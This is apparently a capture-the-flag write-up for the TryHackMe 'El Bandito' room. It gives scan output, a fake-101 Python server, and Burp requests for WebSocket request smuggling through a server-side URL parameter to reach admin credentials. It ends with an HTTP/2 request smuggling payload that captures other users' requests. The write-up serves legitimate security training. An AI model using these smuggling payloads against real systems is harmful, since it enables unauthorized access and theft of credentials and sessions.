
## [El Bandito](https://tryhackme.com/room/elbandito)

**Scanning**

```
nmap -sC -sV -O -p- target_ip
```


```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 16:11 CEST
Nmap scan report for 10.10.180.126
Host is up (0.049s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f7:4f:e7:97:3d:af:28:04:b8:2d:18:7f:0d:b2:b4:8f (RSA)
|   256 97:b6:50:9d:91:7f:f9:81:5d:20:d1:e6:0e:a3:03:8f (ECDSA)
|_  256 32:ec:36:14:50:26:4d:b8:be:6c:7a:f4:cf:38:ee:33 (ED25519)
80/tcp   open  ssl/http El Bandito Server
|_http-server-header: El Bandito Server
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Date: Tue, 17 Jun 2025 14:13:29 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 17 Jun 2025 14:12:37 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 58
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Accept-Ranges: bytes
|     Connection: close
|     nothing to see <script src='/static/messages.js'></script>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 17 Jun 2025 14:12:37 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 0
|     Allow: POST, GET, HEAD, OPTIONS
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest: 
|_    HTTP/1.1 400 Bad Request
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Not valid before: 2021-04-10T06:51:56
|_Not valid after:  2031-04-08T06:51:56
631/tcp  open  ipp      CUPS 2.4
|_http-title: Forbidden - CUPS v2.4.7
|_http-server-header: CUPS/2.4 IPP/2.1
8080/tcp open  http     nginx
|_http-favicon: Spring Java Framework
|_http-title: Site doesn't have a title (application/json;charset=UTF-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.95%T=SSL%I=7%D=6/17%Time=685177D5%P=aarch64-unknown-linu
SF:x-gnu%r(GetRequest,1E5,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2017\x
SF:20Jun\x202025\x2014:12:37\x20GMT\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nContent-Length:\x2058\r\nContent-Security-Policy:\x20defau
SF:lt-src\x20'self';\x20script-src\x20'self';\x20object-src\x20'none';\r\n
SF:X-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\
SF:nX-XSS-Protection:\x201;\x20mode=block\r\nFeature-Policy:\x20microphone
SF:\x20'none';\x20geolocation\x20'none';\r\nAge:\x200\r\nServer:\x20El\x20
SF:Bandito\x20Server\r\nAccept-Ranges:\x20bytes\r\nConnection:\x20close\r\
SF:n\r\nnothing\x20to\x20see\x20<script\x20src='/static/messages\.js'></sc
SF:ript>")%r(HTTPOptions,1CB,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x201
SF:7\x20Jun\x202025\x2014:12:37\x20GMT\r\nContent-Type:\x20text/html;\x20c
SF:harset=utf-8\r\nContent-Length:\x200\r\nAllow:\x20POST,\x20GET,\x20HEAD
SF:,\x20OPTIONS\r\nContent-Security-Policy:\x20default-src\x20'self';\x20s
SF:cript-src\x20'self';\x20object-src\x20'none';\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS-Protection:\x20
SF:1;\x20mode=block\r\nFeature-Policy:\x20microphone\x20'none';\x20geoloca
SF:tion\x20'none';\r\nAge:\x200\r\nServer:\x20El\x20Bandito\x20Server\r\nA
SF:ccept-Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,
SF:1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(FourOhFourRequest,26
SF:C,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nDate:\x20Tue,\x2017\x20Jun\x2020
SF:25\x2014:13:29\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r
SF:\nContent-Length:\x20207\r\nContent-Security-Policy:\x20default-src\x20
SF:'self';\x20script-src\x20'self';\x20object-src\x20'none';\r\nX-Content-
SF:Type-Options:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS-Pro
SF:tection:\x201;\x20mode=block\r\nFeature-Policy:\x20microphone\x20'none'
SF:;\x20geolocation\x20'none';\r\nAge:\x200\r\nServer:\x20El\x20Bandito\x2
SF:0Server\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lan
SF:g=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>Th
SF:e\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.\x
SF:20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x20
SF:your\x20spelling\x20and\x20try\x20again\.</p>\n");
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 207.11 seconds

```
Nmap revealed the following open ports:

- 22/tcp – SSH (OpenSSH 8.2p1)
- 80/tcp – SSL HTTP (Custom: El Bandito Server)
- 631/tcp – CUPS Web Interface (2.4.7)
- 8080/tcp – HTTP (nginx, Spring Framework favicon)


**Directory Bruteforce**
```
python dirsearch.py -u http://target_ip:8080
```

<img width="403" alt="1" src="https://github.com/user-attachments/assets/4123c39a-fef7-46eb-a1b9-5860f855e2ad" />


Navigating to target_ip:8080, I accessed the Burn Token section:

![2](https://github.com/user-attachments/assets/ad6e2580-4757-4299-84d8-fd6ec8276ae6)

**WebSocket Analysis**

Intercepting the traffic reveals that the Burn Token interaction is based on WebSockets:

![3](https://github.com/user-attachments/assets/9ebb4845-99be-499b-9cfc-fb47d29d7efa)



I am investigating a potential WebSocket Request Smuggling vulnerability.


**WebSocket Smuggling Exploit**

Try downgrading the WebSocket version in the request:

<img width="802" alt="4" src="https://github.com/user-attachments/assets/7e1807af-7557-47db-b325-cd10c55d3678" />


I want the proxy to believe that a valid WebSocket connection has been established and to return:


`HTTP/1.1 101 Switching Protocols`

**Local Server for Response Manipulation**

I'm trying to intercept the request to target_ip:8080/services.html:

<img width="380" alt="5" src="https://github.com/user-attachments/assets/c2f2bd2e-8c73-4605-8e55-240c8dd540f4" />


Script to emulate a 101 Switching Protocols response:

```
import sysfrom http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

Run the server
```
python server.py 5555
```

Then, send this request via BurpSuite:

```
GET /isOnline?url=http://attack_ip:5555 HTTP/1.1
Host: target_ip:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-WebSocket-Version: 500
Referer: http://target_ip:8080/services.html
Connection: keep-alive
Priority: u=4
Upgrade: websocket

GET /trace HTTP/1.1
Host: target_ip:8080
```

Found two new directories:
`admin-creds`
`admin-flag`

Now try:
```
GET /admin-flag HTTP/1.1
Host: target_ip:8080
```

<img width="728" alt="6" src="https://github.com/user-attachments/assets/dbb4757b-4592-43c5-951f-edf487f6c766" />


This returns the first flag.

Next:

```
GET /isOnline?url=http://attack_ip:5555 HTTP/1.1
Host: target_ip:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-WebSocket-Version: 500
Referer: http://target_ip:8080/services.html
Connection: keep-alive
Priority: u=4
Upgrade: websocket

GET /admin-creds HTTP/1.1
Host: target_ip:8080
```

Now i receive the admin credentials.


<img width="888" alt="1" src="https://github.com/user-attachments/assets/42a10d69-8908-4b81-ae67-5a7e929ce87a" />




For better understanding, check out [Request Smuggling: WebSockets](https://tryhackme.com/room/wsrequestsmuggling).


**Exploring the SSL Web Server on Port 80**

Visiting https://target_ip, i get:

![1](https://github.com/user-attachments/assets/5da85624-a9ad-4e4a-8fa9-a3bee52ee38d)



Checking the Page Source, i discover:

![1](https://github.com/user-attachments/assets/6c805204-cf4d-4091-bb4d-7a9579f30dde)


This JavaScript handles user chat (JACK, OLIVER) and contains a route /getMessages::

```
document.addEventListener("DOMContentLoaded", function () { const discussions = document.querySelectorAll(".discussion");
 const messagesChat = document.querySelector(".messages-chat");
 const headerName = document.querySelector(".header-chat .name");
 const writeMessageInput = document.querySelector(".write-message");
 let userMessages = {
  JACK: [],
  OLIVER: [],
 };

 // Function to fetch messages from the server
 function fetchMessages() {
  fetch("/getMessages")
   .then((response) => {
    if (!response.ok) {
     throw new Error("Failed to fetch messages");
    }
    return response.json();
   })
   .then((messages) => {
    userMessages = messages;
    userMessages.JACK === undefined
     ? (userMessages = { OLIVER: messages.OLIVER, JACK: [] })
     : userMessages.OLIVER === undefined &&
       (userMessages = { JACK: messages.JACK, OLIVER: [] });

    displayMessages("JACK");
   })
   .catch((error) => console.error("Error fetching messages:", error));
 }

 // Function to display messages for the selected user
 function displayMessages(userName) {
  headerName.innerText = userName;
  messagesChat.innerHTML = "";
  userMessages[userName].forEach(function (messageData) {
   appendMessage(messageData);
  });
 }

 // Function to append a message to the chat area
 function appendMessage(messageData) {
  const newMessage = document.createElement("div");
  console.log({ messageData });
  newMessage.classList.add("message", "text-only");
  newMessage.innerHTML = `
           ${messageData.sender !== "Bot" ? '<div class="response">' : ""}
        <div class="text">${messageData}</div>
    ${messageData.sender !== "Bot" ? "</div>" : ""}
        `;
  messagesChat.appendChild(newMessage);
 }

 // Function to send a message to the server
 function sendMessage() {
  const messageText = writeMessageInput.value.trim();
  if (messageText !== "") {
   const activeUser = headerName.innerText;
   const urlParams = new URLSearchParams(window.location.search);
   const isBot =
    urlParams.has("msg") && urlParams.get("msg") === messageText;

   const messageData = {
    message: messageText,
    sender: isBot ? "Bot" : activeUser, // Set the sender as "Bot"
   };
   userMessages[activeUser].push(messageData);
   appendMessage(messageText);
   writeMessageInput.value = "";
   scrollToBottom();
   console.log({ activeUser });
   fetch("/send_message", {
    method: "POST",
    headers: {
     "Content-Type": "application/x-www-form-urlencoded",
    },
    body: "data="+messageText
   })
    .then((response) => {
     if (!response.ok) {
      throw new Error("Network response was not ok");
     }
     console.log("Message sent successfully");
    })
    .catch((error) => {
     console.error("Error sending message:", error);
     // Handle error (e.g., display error message to the user)
    });
  }
 }

 // Event listeners
 discussions.forEach(function (discussion) {
  discussion.addEventListener("click", function () {
   const userName = this.dataset.name;
   console.log({ userName });
   displayMessages(userName.toUpperCase());
  });
 });

 const sendButton = document.querySelector(".send");
 sendButton.addEventListener("click", sendMessage);
 writeMessageInput.addEventListener("keydown", function (event) {
  if (event.key === "Enter") {
   event.preventDefault();
   sendMessage();
  }
 });

 // Initial actions
 fetchMessages();
});

// Function to scroll to the bottom of the messages chat
function scrollToBottom() {
 const messagesChat = document.getElementById("messages-chat");
 messagesChat.scrollTop = messagesChat.scrollHeight;
}
```
**Directory Discovery (Port 80)**


```
python dirsearch.py -u https://target_ip:80
```

<img width="632" alt="1" src="https://github.com/user-attachments/assets/a0f1eae1-420c-451b-9fdc-c4c366574a1f" />



Results reveal /access endpoint.

Using previously obtained admin credentials, i can access this area:

![1](https://github.com/user-attachments/assets/5bf3b086-f8bd-46f9-84ad-0ed396db0729)

**Accessing the Admin Panel (Port 80)**

If I slightly reconstruct the request in Burp, it works like this:

<img width="818" alt="1" src="https://github.com/user-attachments/assets/ec510bbc-1943-4a84-b89e-3577d75b9b3d" />


So, I was able to send messages using my session.

Next, I decided to try HTTP/2 request smuggling.

There was also a helpful walkthrough on [`HTTP/2 Request Smuggling`](https://tryhackme.com/room/http2requestsmuggling) I followed.

First, I modified requests by switching protocols between HTTP/2 and HTTP/1.1, disabling the Upgrade Content-Length header.

<img width="831" alt="1" src="https://github.com/user-attachments/assets/56f245d9-0f73-4742-b925-7898bea2e968" />


Yeah, that worked.

Then, I modified the request and switched it back to HTTP/2:

```
POST / HTTP/2
Host: target_ip:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aFGF_g._K0bucZYIRUr8rw1EBKS0VR0vus
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Length: 0

POST /send_message HTTP/1.1
Host: target_ip:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aFGF_g._K0bucZYIRUr8rw1EBKS0VR0vus
Content-Type: application/x-www-form-urlencoded
Content-Length: 730

data=
```

After waiting for a moment, I visited:

`https://target_ip:80/getMessages`

![1](https://github.com/user-attachments/assets/c0d1bfc8-d357-4bd4-88a1-01cb4681e8f4)


And there it was — the second flag!
